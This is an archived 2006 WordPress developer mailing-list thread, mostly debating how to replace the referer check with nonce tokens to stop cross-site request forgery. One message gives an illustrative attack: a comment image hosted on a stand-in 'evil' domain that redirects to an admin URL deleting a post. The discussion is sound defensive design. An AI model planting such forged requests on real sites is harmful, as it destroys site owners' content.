References: <443FF707.6040803@szub.net>	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>	<44401C7B.10205@szub.net>	<a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>	<444113BD.4040400@robm.me.uk>
	<5aa3aa0604150907x2ed5b5dat74f93affe71d74e0@mail.gmail.com>
Message-ID: <44411E01.1040007@robm.me.uk>

Craig wrote:
> Good question. The first thing I do on a new install is turn off the WYSIWYG
> editor.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>   
Same here, as do most people I know. The WYSIWYG editor serves a vital 
purpose, but it (and its users) shouldn't be accommodated for at the 
expense of regular ol' text-box users. If some added functionality has 
no effect on WYSIWYG users but would be useful for plain text-box users, 
why dismiss it?

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From false.hopes at gmail.com  Sat Apr 15 16:49:12 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Apr 15 16:53:04 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <44411E01.1040007@robm.me.uk>
References: <443FF707.6040803@szub.net>
	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>
	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>
	<44401C7B.10205@szub.net>
	<a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>
	<444113BD.4040400@robm.me.uk>
	<5aa3aa0604150907x2ed5b5dat74f93affe71d74e0@mail.gmail.com>
	<44411E01.1040007@robm.me.uk>
Message-ID: <a491f91d0604150949v9ea592ejb4dae08b9fe473e0@mail.gmail.com>

On 4/15/06, Rob <r@robm.me.uk> wrote:
>  If some added functionality has
> no effect on WYSIWYG users but would be useful for plain text-box users,
> why dismiss it?

The functionality is already there, nothing is being dismissed, you
can already see how your post looks rendered.

--
--Robert Deaton
http://somethingunpredictable.com
From chris.lott at gmail.com  Sat Apr 15 16:58:02 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Sat Apr 15 17:01:56 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <443FF707.6040803@szub.net>
References: <443FF707.6040803@szub.net>
Message-ID: <9b1b9dab0604150958hd44ba57v8b379bf2187f5411@mail.gmail.com>

On 4/14/06, Kaf Oseo <kaf@szub.net> wrote:
> Who's for adding a preview.php to the template hierarchy? I'm itching
> to add something barely useful to the core today...

Coming late, but this seems of marginal value. The delay in the
in-line preview is irksome at times (especially if your main template
uses a lot of rendered content), but it is exact. The difference
between the WYSIWYG editing area and a separate preview template
doesn't seem like it's worth that much-- some leading, etc. I guess if
one posts a lot of inline images and has a fixed width design and
perhaps is *really* obsessive about seeing the precise
font/leading/sizes beforehand...

At the very least it seems like plugin territory.

c
From r at robm.me.uk  Sat Apr 15 20:55:05 2006
From: r at robm.me.uk (Rob)
Date: Sat Apr 15 20:55:30 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <a491f91d0604150949v9ea592ejb4dae08b9fe473e0@mail.gmail.com>
References: <443FF707.6040803@szub.net>	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>	<44401C7B.10205@szub.net>	<a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>	<444113BD.4040400@robm.me.uk>	<5aa3aa0604150907x2ed5b5dat74f93affe71d74e0@mail.gmail.com>	<44411E01.1040007@robm.me.uk>
	<a491f91d0604150949v9ea592ejb4dae08b9fe473e0@mail.gmail.com>
Message-ID: <44415DA9.4030304@robm.me.uk>

Robert Deaton wrote:
> On 4/15/06, Rob <r@robm.me.uk> wrote:
>   
>>  If some added functionality has
>> no effect on WYSIWYG users but would be useful for plain text-box users,
>> why dismiss it?
>>     
>
> The functionality is already there, nothing is being dismissed, you
> can already see how your post looks rendered.
>
> --
> --Robert Deaton
> http://somethingunpredictable.com
>   
> ------------------------------------------------------------------------
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   
It would be an enhancement to be able to choose just a rendering of the 
text without the need to load the full site, though.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From r at schestowitz.com  Sun Apr 16 01:23:18 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Sun Apr 16 01:21:34 2006
Subject: [wp-hackers] Google Summer of Code
In-Reply-To: <002201c66037$58e8aff0$0664a8c0@tiger1>
References: <002201c66037$58e8aff0$0664a8c0@tiger1>
Message-ID: <20060416022318.9n43otn5if8ggwkw@banana.catalyst2.com>

___/ On Sat 15 Apr 2006 03:50:21 BST, [ Brian Layman ] wrote : \___

>> From GAIM's page:
> [quote]
> Introduction
> Gaim is proud to participate in the Google Summer of Code. This summer
> Google is putting up $1 million dollars for students to work on free
> software projects under the mentorship of experienced free software
> developers. The Gaim developers are glad to volunteer to mentor some
> students and introduce them to the world of open-source development.
>
> Students may apply for the program at Google's webpage by selecting
> "Gaim" as their sponsor. Google and Gaim will then work together to
> select from the candidates. The chosen candidates will then work closely
> with Gaim developers to complete their project. Upon completion, the
> student will receive $4500 AND a tee-shirt!
> [/quote]
>
> Pretty sweet.  There are certainly worse ways to spend your summer
> hours...

IIRC, Google hired GAIM's lead developer a couple of months back. This
happened very much near the time when Google Talk had gone public. One
wonders how Blogspot, Blogger, and Google's most recent page construction
service (overwhelmed by demand at launchtime) serve them. While they
already commit changes to FOSS projects like Apache, any similar
contributions to wp.org would help wp.com, which probably goes head-to-head
with Blogger and Blogspot. This leads to collision of interests, which could
not be raised in last year's Summer of Code discussion in wp-hackers.

Just a thought...

Roy

From ryan at boren.nu  Sun Apr 16 03:32:21 2006
From: ryan at boren.nu (Ryan Boren)
Date: Sun Apr 16 02:36:13 2006
Subject: [wp-hackers] Preview template
In-Reply-To: <44415DA9.4030304@robm.me.uk>
References: <443FF707.6040803@szub.net>	<a491f91d0604141354u28c3bc00o78318233ea7f4aea@mail.gmail.com>	<9625F5D0-4063-40D2-B102-6CDBB41D651A@txfx.net>	<44401C7B.10205@szub.net>	<a491f91d0604141538m36a35eft895b1086af89f51d@mail.gmail.com>	<444113BD.4040400@robm.me.uk>	<5aa3aa0604150907x2ed5b5dat74f93affe71d74e0@mail.gmail.com>	<44411E01.1040007@robm.me.uk>	<a491f91d0604150949v9ea592ejb4dae08b9fe473e0@mail.gmail.com>
	<44415DA9.4030304@robm.me.uk>
Message-ID: <4441BAC5.8090803@boren.nu>

Rob wrote:
> It would be an enhancement to be able to choose just a rendering of the 
> text without the need to load the full site, though.

The full preview is one of our most popular features and is often cited 
as a primary reason for switching to WP.  So, that will remain the 
default.  The behavior can be changed through plugins by those who want 
something different.  Also, keep in mind that the full preview shows the 
content after all filters have been run.  WYSIWYG does not.

Ryan
From mark.wordpress at txfx.net  Mon Apr 17 06:26:47 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Mon Apr 17 06:30:46 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
Message-ID: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>

Protecting the WordPress admin from CSF attacks with  
check_admin_referer() is getting really old for me.  Many mobile  
browsing devices go through a proxy that strips them, and more and  
more people at home are getting "Internet security" suites that are  
stripping them.  I had a client ask me "why is this happening?  I  
never had problems like this with Movable Type."  Yeah, I could give  
him the whole reason for it, but from his perspective it is just  
"this is annoying, and I've only had this problem with WordPress."   
And seeing that there is a way around this that, I don't see why we  
shouldn't pursue it.

Here's my suggestion:

1) function wp_secure_form($key='') { }

This function would echo out a hidden from input with an md5 hash  
computed on (a) the database password, (b) the userid, and (c) the  
optional key.  This would give us a hash that is unique to the  
specific WP user on that install, and optionally, specific to the  
particular task being performed.  For example, for deleting a post,  
you could do wp_secure_form('delete_post_' . $post_id); and it would  
be locked down to the install, the user, the "delete" action, and  
that specific post.

2) function wp_check_form($key='') { }

This would just compare the computed hash against $_POST 
['wp_secure_form_key']; or something.

We could take this opportunity to do a thorough check for unsecured  
forms, as well as recommend that plugin authors use this method.  I'm  
willing to write the patch, but it's not going to be a 15-minute  
affair, and my time is increasingly scarce, so I'd like to get some  
positive feedback (especially from someone with commit access) before  
spending time on it.

--
Mark Jaquith
http://txfx.net/


From mark.wordpress at txfx.net  Mon Apr 17 06:33:30 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Mon Apr 17 06:37:27 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
Message-ID: <F7F50373-EC44-4B12-B2A8-5173FEDC7CC1@txfx.net>

Sorry for the double post, but please see this thread from last year  
that died on the vine:

http://comox.textdrive.com/pipermail/wp-hackers/2005-August/002391.html

Several developers seemed to be in favor of the idea, including Matt  
and Owen, so with a couple of +1s to let me know that your opinion on  
the matter hasn't changed, and I'll proceed with the patch as soon as  
I have time.
--
Mark Jaquith
http://txfx.net/


From r at robm.me.uk  Mon Apr 17 06:38:54 2006
From: r at robm.me.uk (Rob)
Date: Mon Apr 17 06:41:25 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
Message-ID: <444337FE.2010007@robm.me.uk>

Excuse my ignorance, but what are CSF attacks (Google only seems to turn 
up one of your comments on Matt's site, relating to XSS attacks) and in 
what way do they somehow bypass user level/cap checking? Surely if we 
check the user's permissions on every admin page, we eradicate the 
possibility of a user somehow accessing functionality they're not 
supposed to be able to access?

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From m at mullenweg.com  Mon Apr 17 06:37:36 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon Apr 17 06:41:35 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
Message-ID: <444337B0.3040004@mullenweg.com>

Mark Jaquith wrote:
> Protecting the WordPress admin from CSF attacks with 
> check_admin_referer() is getting really old for me.  Many mobile 
> browsing devices go through a proxy that strips them, and more and more 
> people at home are getting "Internet security" suites that are stripping 
> them.  I had a client ask me "why is this happening?  I never had 
> problems like this with Movable Type."  Yeah, I could give him the whole 
> reason for it, but from his perspective it is just "this is annoying, 
> and I've only had this problem with WordPress."  And seeing that there 
> is a way around this that, I don't see why we shouldn't pursue it.

You could always disable for that client, in fact a plugin that did that 
would probably be popular. We just need protection in the core, partly 
so every wannabe security "researcher" doesn't scare our entire userbase 
every month.

> 1) function wp_secure_form($key='') { }
> 
> This function would echo out a hidden from input with an md5 hash 
> computed on (a) the database password, (b) the userid, and (c) the 
> optional key.  This would give us a hash that is unique to the specific 
> WP user on that install, and optionally, specific to the particular task 
> being performed.  For example, for deleting a post, you could do 
> wp_secure_form('delete_post_' . $post_id); and it would be locked down 
> to the install, the user, the "delete" action, and that specific post.

Unfortunately this doesn't work, because it's trivial to fetch the page 
and grab the key/nonce before submitting the malicious request.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From r at robm.me.uk  Mon Apr 17 06:40:21 2006
From: r at robm.me.uk (Rob)
Date: Mon Apr 17 06:42:47 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
Message-ID: <44433855.7040203@robm.me.uk>

Damn, found it straight after posting. For anyone else that's wondering:

http://en.wikipedia.org/wiki/Cross-site_request_forgery

Sorry for the superfluous post!

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From mark.wordpress at txfx.net  Mon Apr 17 08:01:10 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Mon Apr 17 08:05:08 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444337B0.3040004@mullenweg.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<444337B0.3040004@mullenweg.com>
Message-ID: <45BDF613-E564-457F-AFFE-115208D0A4BE@txfx.net>

On Apr 17, 2006, at 2:37 AM, Matt Mullenweg wrote:

>> 1) function wp_secure_form($key='') { }
>> This function would echo out a hidden from input with an md5 hash  
>> computed on (a) the database password, (b) the userid, and (c) the  
>> optional key.  This would give us a hash that is unique to the  
>> specific WP user on that install, and optionally, specific to the  
>> particular task being performed.  For example, for deleting a  
>> post, you could do wp_secure_form('delete_post_' . $post_id); and  
>> it would be locked down to the install, the user, the "delete"  
>> action, and that specific post.
>
> Unfortunately this doesn't work, because it's trivial to fetch the  
> page and grab the key/nonce before submitting the malicious request.

How could this be done without <script> injection (a security problem  
in its own right)?  It may just be that it is 4am, but without  
injection of a malicious script, in which case the security breach  
has already occurred, I can't see how you are going to load the page  
as the authenticated user and extract the key.  There's probably a  
"oh, duh" answer to this, but I just can't see it now.

--
Mark Jaquith
http://txfx.net/


From wp-hackers at paul-mitchell.me.uk  Mon Apr 17 08:03:14 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Mon Apr 17 08:08:07 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444337B0.3040004@mullenweg.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<444337B0.3040004@mullenweg.com>
Message-ID: <44434BC2.2040801@paul-mitchell.me.uk>

Guys,

As I understand it, the problem is that command URLs to the
administrative interface can be forged because they contain nothing
secret. The simple solution is a Personal Identification Number.

All administrative users may enter a PIN on their profile. WP
automatically appends it to every administrative command URL it
generates (e.g. &action=deletepost&PIN=1234). On the flip-side, WP
checks the incoming PIN on the command URL against that of the logged-in
administrator and, on a mismatch, refuses the command and records the
attempt.

Command URLs could only then be forged if the attacker knows the
administrator's PIN, which can be changed at will. The administrator
sees and feels nothing different.

This seems "slap-forehead" simple, and it's early, so I could be talking
bollocks. :)

-- 
Paul Mitchell, Coding and Crafting Quality Software
http://www.libertini.net/libertus/category/software/


From skeltoac at gmail.com  Mon Apr 17 08:10:34 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Apr 17 08:14:28 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44434BC2.2040801@paul-mitchell.me.uk>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<444337B0.3040004@mullenweg.com>
	<44434BC2.2040801@paul-mitchell.me.uk>
Message-ID: <e6ec604d0604170110i7d199910yc759e13f8b1e4072@mail.gmail.com>

On 4/17/06, Paul Mitchell <wp-hackers@paul-mitchell.me.uk> wrote:
> Command URLs could only then be forged if the attacker knows the
> administrator's PIN, which can be changed at will. The administrator
> sees and feels nothing different.

The URL is the most-often logged piece of an HTTP request. I wouldn't
feel good about that kind of security unless it were over HTTPS.

Andy
From mark.wordpress at txfx.net  Mon Apr 17 08:15:05 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Mon Apr 17 08:19:00 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44434BC2.2040801@paul-mitchell.me.uk>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<444337B0.3040004@mullenweg.com>
	<44434BC2.2040801@paul-mitchell.me.uk>
Message-ID: <4B01EAF5-0FF1-4C7F-B624-D1250ED1BEF6@txfx.net>

On Apr 17, 2006, at 4:03 AM, Paul Mitchell wrote:

> The simple solution is a Personal Identification Number.
>
> All administrative users may enter a PIN on their profile. WP
> automatically appends it to every administrative command URL it
> generates (e.g. &action=deletepost&PIN=1234). On the flip-side, WP
> checks the incoming PIN on the command URL against that of the  
> logged-in
> administrator and, on a mismatch, refuses the command and records the
> attempt.

That's basically a simplified version of what I was suggesting... but  
for POSTs.  We shouldn't be performing DB-changing tasks on GET  
requests.  Additionally, the hash I'm suggesting would be automatic,  
and optionally unique to the unique action being performed and object  
being manipulated.  But if Matt's right about an attacker being able  
to extract the key/PIN, they're both useless...

--
Mark Jaquith
http://txfx.net/


From wp-hackers at paul-mitchell.me.uk  Mon Apr 17 10:57:03 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Mon Apr 17 11:01:55 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <e6ec604d0604170110i7d199910yc759e13f8b1e4072@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<444337B0.3040004@mullenweg.com>	<44434BC2.2040801@paul-mitchell.me.uk>
	<e6ec604d0604170110i7d199910yc759e13f8b1e4072@mail.gmail.com>
Message-ID: <4443747F.1090200@paul-mitchell.me.uk>

Andy Skelton wrote:
> The URL is the most-often logged piece of an HTTP request. I wouldn't
> feel good about that kind of security unless it were over HTTPS.
True, but I don't currently need your httpd log to forge a valid WP
admin command URL for your site, SSL or otherwise.

For sure, a PIN-armoured URL would be recorded in your site's httpd
logs. If that is a security issue, the PIN can be obfuscated or changed
regularly. The PIN won't be recorded in anyone else's logs. PIN leakage
through referral won't be a problem because the admin commands that need
protection naturally redirect and would remove the (now unnecessary) PIN
from the terminal URL.

Paul

From sam at rephrase.net  Mon Apr 17 12:09:25 2006
From: sam at rephrase.net (Sam Angove)
Date: Mon Apr 17 12:13:20 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <45BDF613-E564-457F-AFFE-115208D0A4BE@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<444337B0.3040004@mullenweg.com>
	<45BDF613-E564-457F-AFFE-115208D0A4BE@txfx.net>
Message-ID: <aa74b1910604170509n29ecae3dk7218a4d27b6774b1@mail.gmail.com>

On 4/17/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> On Apr 17, 2006, at 2:37 AM, Matt Mullenweg wrote:
>
> > Unfortunately this doesn't work, because it's trivial to fetch the
> > page and grab the key/nonce before submitting the malicious request.
>
> How could this be done without <script> injection (a security problem
> in its own right)?  It may just be that it is 4am, but without
> injection of a malicious script, in which case the security breach
> has already occurred, I can't see how you are going to load the page
> as the authenticated user and extract the key.

Yeah. This kind of token is suggested by pretty much everyone,
including the PHP Security Consortium[1], so there's been a lot of
experienced eyes that haven't found a problem. (And if there *is* a
working exploit, the wider community really, really needs to know
about it.)

The JavaScript security model shouldn't allow the external page
content to be read unless the attack is from the same domain, and CSRF
is the least of your worries if you have a script injection problem.

[1]:  http://phpsec.org/projects/guide/2.html
From wp-hackers at paul-mitchell.me.uk  Mon Apr 17 12:41:39 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Mon Apr 17 12:46:21 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4B01EAF5-0FF1-4C7F-B624-D1250ED1BEF6@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<444337B0.3040004@mullenweg.com>	<44434BC2.2040801@paul-mitchell.me.uk>
	<4B01EAF5-0FF1-4C7F-B624-D1250ED1BEF6@txfx.net>
Message-ID: <44438D03.1010209@paul-mitchell.me.uk>

Guys,

If function check_admin_referer() were moved from
wp-admin/admin-functions.php into wp-includes/pluggable-functions.php,
we could begin to experiment with different approaches using plugins,
out-of-box remaining the status quo.

An immediate benefit would be that people who cannot use WordPress
because of the referer check could relax it with a "null" plugin.

Paul

From sam at rephrase.net  Mon Apr 17 13:11:26 2006
From: sam at rephrase.net (Sam Angove)
Date: Mon Apr 17 13:15:20 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44438D03.1010209@paul-mitchell.me.uk>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<444337B0.3040004@mullenweg.com>
	<44434BC2.2040801@paul-mitchell.me.uk>
	<4B01EAF5-0FF1-4C7F-B624-D1250ED1BEF6@txfx.net>
	<44438D03.1010209@paul-mitchell.me.uk>
Message-ID: <aa74b1910604170611m2fd7f5er2d0b2409ffdc993d@mail.gmail.com>

On 4/17/06, Paul Mitchell <wp-hackers@paul-mitchell.me.uk> wrote:
>
> If function check_admin_referer() were moved from
> wp-admin/admin-functions.php into wp-includes/pluggable-functions.php,
> we could begin to experiment with different approaches using plugins,
> out-of-box remaining the status quo.

Done and done in http://trac.wordpress.org/changeset/3497 .

I don't think Mark's suggestion can be implemented in a plugin without
a series of terrible hacks, though, so it's not enough.
From ringmaster at midnightcircus.com  Mon Apr 17 13:44:14 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Apr 17 13:44:07 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <F7F50373-EC44-4B12-B2A8-5173FEDC7CC1@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<F7F50373-EC44-4B12-B2A8-5173FEDC7CC1@txfx.net>
Message-ID: <44439BAE.9040401@midnightcircus.com>

Mark Jaquith wrote:
> Sorry for the double post, but please see this thread from last year 
> that died on the vine:
> 
> http://comox.textdrive.com/pipermail/wp-hackers/2005-August/002391.html
> 
> Several developers seemed to be in favor of the idea, including Matt and 
> Owen, so with a couple of +1s to let me know that your opinion on the 
> matter hasn't changed, and I'll proceed with the patch as soon as I have 
> time.

I still think this is a good idea, but...

This is going to kill a lot of plugins; pretty much anything that uses 
an options page.  So what can be done to mitigate that?

My first thought is that the real problem around which all of this is 
base is executing actions in the admin without performing a 
confirmation.  For example, you click on an unobtrusive link on a 
foreign site that sends you back to your own site's admin to delete post 
#327.  If there is no confirmation for this action, then your site is 
vulnerable.

So the first thing we should be doing is confirming every action that 
could be accessed externally.  This is really freaking annoying, as I've 
noticed with deleting moderated comments from email in 2.1, since I 
didn't have to confirm those in < 2.1 and now I do.

Supposing we could add the action-based nonces to URLs as Mark 
describes, we could avoid some of that pain.

Perhaps a generic check could be performed in admin.php that looks for 
the nonce, and if not found, redirects to a generic confirmation page. 
The confirmation page could build a $_POST/$_GET form (based on the 
original request) that uses the originally submitted values.  It would 
simply ask, "Are you sure you want to do this?"  And if the user clicks 
"OK" then it submits the form on to the originally intended script with 
an appropriate nonce.

That would mitigate some of the plugin breakage, since any plugin that 
didn't build the nonce into its own requests would pass through this 
confirmation.  It also saves from having to immediately add the nonce 
building code to every admin page.  And if this check is centralized, 
then the admin pages and plugins need only worry about appending it to 
their form input, not necessarily checking for it themselves.  (Although 
exposing the function that does so would be useful for plugins with Ajax 
requests that wouldn't pass through that verification code.)

I don't see a way that external sites can scrape the nonces from the 
admin pages, since you would need to be logged in to do that.  It would 
be especially difficult if the nonces were encoded by user id, because 
using someone else's "delete all posts" link would force a confirmation 
on you.  So even if someone else scraped their nonce from your site's 
admin pages, their links would still require a confirmation from you, 
since you're not using your own unique nonce.

Owen

From wp-hackers at paul-mitchell.me.uk  Mon Apr 17 14:10:18 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Mon Apr 17 14:15:10 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604170611m2fd7f5er2d0b2409ffdc993d@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<444337B0.3040004@mullenweg.com>	<44434BC2.2040801@paul-mitchell.me.uk>	<4B01EAF5-0FF1-4C7F-B624-D1250ED1BEF6@txfx.net>	<44438D03.1010209@paul-mitchell.me.uk>
	<aa74b1910604170611m2fd7f5er2d0b2409ffdc993d@mail.gmail.com>
Message-ID: <4443A1CA.8030108@paul-mitchell.me.uk>

Sam Angove wrote:
> Done and done in http://trac.wordpress.org/changeset/3497 .
>   
Fantastic! I have it already too. :blush:
> I don't think Mark's suggestion can be implemented in a plugin without
> a series of terrible hacks, though, so it's not enough.
>   
But now we can hack. That is terrible enough for me. Thanks guys!

Paul

From jjb at ibiblio.org  Mon Apr 17 14:32:38 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Mon Apr 17 14:36:36 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
Message-ID: <Pine.LNX.4.61.0604171020410.2082@tribal.metalab.unc.edu>


On Mon, 17 Apr 2006, Mark Jaquith wrote:

> 1) function wp_secure_form($key='') { }

> This function would echo out a hidden from input with an md5 hash 
> computed on (a) the database password, (b) the userid, and (c) the 
> optional key.

> 2) function wp_check_form($key='') { }
>
> This would just compare the computed hash against $_POST 
> ['wp_secure_form_key']; or something.

This is precisely what I have done with Lyceum. The relevant functions are 
in this file starting at line 115:

http://source.ibiblio.org/trac/lyceum/browser/trunk/src/lib/functions.php

Every form or administrative link in the system is given a token:

function tokeninput($targetscript, $action='default', $id=0){
 	$token = formtoken($targetscript, $action, $id);
 	return "<input type=\"hidden\" name=\"token\" value=\"$token\" />";
}

And is validated at the receiving end:

function validateToken( $token, $targetscript, $action='default', $id=0 ){
 	if (!tokenIsValid( $token, $targetscript, $action, $id ))
 		badTokenMessage();
}

The tokens are specific to a logged-in user, and expire after a set time. 
After they are validated, they are deleted. The timeout feature of this 
needs a bit of refinement, because right now if someone edits a post for 
more than the timeout time, they will loose their post. But overall I am 
very happy with how this system fits into the rest of my code.

Right now the tokens are being managed with a php session, but they could 
also be put into the database if y'all don't like using sessions (as an 
aside, why is authentication done directly with cookies instead of with 
sessions?)

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704 
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/ 
http://blog.johnjosephbachir.org/

From Brian at TheCodeCave.com  Mon Apr 17 14:34:43 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 17 14:38:42 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44439BAE.9040401@midnightcircus.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9804E@dsimail.drbsystems.com>

>My first thought is that the real problem around which all of this is 
>base is executing actions in the admin without performing a 
>confirmation.  For example, you click on an unobtrusive link on a 
>foreign site that sends you back to your own site's admin to delete post 
>#327.  If there is no confirmation for this action, then your site is 
>vulnerable.
The real issue isn't a link being clicked on some foreign page, but a
redirected image url linked to from your post comments.  All this takes is
someone putting an image in your comments (such as
[img]http://www.evil_doers.com/example1.gif[/img]) that actually redirects
to
/wp-admin/post.php?action=delete&post=100.  Without having the referer check
there, that post is history.  

Read this a few times and you start to see the real dangers here:
http://www.tux.org/~peterw/csrf.txt

>So the first thing we should be doing is confirming every action that 
>could be accessed externally.  This is really freaking annoying, as I've 
>noticed with deleting moderated comments from email in 2.1, since I 
>didn't have to confirm those in < 2.1 and now I do.

One solution I see this for all this is to give WordPress two different
methods of security.  Then these would be selectable in User profile. Either
the admin/user must have a valid referer from an admin section to do any
admin function, OR they will have to deal with an excesive number of AYS
prompts.  

BTW I've seen complaints about the security risk known as the Preview Post
Feature.  I never understood why it was a risk until writing this reply.  I
think, basically, with the right (wrong) plugin enabled, the Preview could
allow user-supplied content to have an admin referer context. Couldn't it?
Could a plugin that shows user supplied avatars with recent comments, embed
a redirected url with an admin level request that would pass the admin
referer check?

From false.hopes at gmail.com  Mon Apr 17 14:46:20 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Apr 17 14:50:14 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <Pine.LNX.4.61.0604171020410.2082@tribal.metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171020410.2082@tribal.metalab.unc.edu>
Message-ID: <a491f91d0604170746q2b0abff1qc3ff79585e2cbef9@mail.gmail.com>

On 4/17/06, John Joseph Bachir <jjb@ibiblio.org> wrote:
> Right now the tokens are being managed with a php session, but they could
> also be put into the database if y'all don't like using sessions (as an
> aside, why is authentication done directly with cookies instead of with
> sessions?)

Protecting session ids is a chore, they're sent back and forth on each
request, and anybody who manages to steal one now has full access as a
user. The only way sessions can be more secure than cookies is if its
all done over SSL, something that is not an option for the everday
blog

--
--Robert Deaton
http://somethingunpredictable.com
From false.hopes at gmail.com  Mon Apr 17 14:56:18 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Apr 17 15:00:30 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9804E@dsimail.drbsystems.com>
References: <44439BAE.9040401@midnightcircus.com>
	<D0252C90757CBC4B8BC938A72BEDDF9DF9804E@dsimail.drbsystems.com>
Message-ID: <a491f91d0604170756h18deacb0g9abec4e763f73546@mail.gmail.com>

On 4/17/06, Brian Layman <Brian@thecodecave.com> wrote:
> >My first thought is that the real problem around which all of this is
> >base is executing actions in the admin without performing a
> >confirmation.  For example, you click on an unobtrusive link on a
> >foreign site that sends you back to your own site's admin to delete post
> >#327.  If there is no confirmation for this action, then your site is
> >vulnerable.
> The real issue isn't a link being clicked on some foreign page, but a
> redirected image url linked to from your post comments.  All this takes is
> someone putting an image in your comments (such as
> [img]http://www.evil_doers.com/example1.gif[/img]) that actually redirects
> to
> /wp-admin/post.php?action=delete&post=100.  Without having the referer check
> there, that post is history.

I think you missed the original point of the thread and the original
point of the post you replied to. We are trying to get rid of referrer
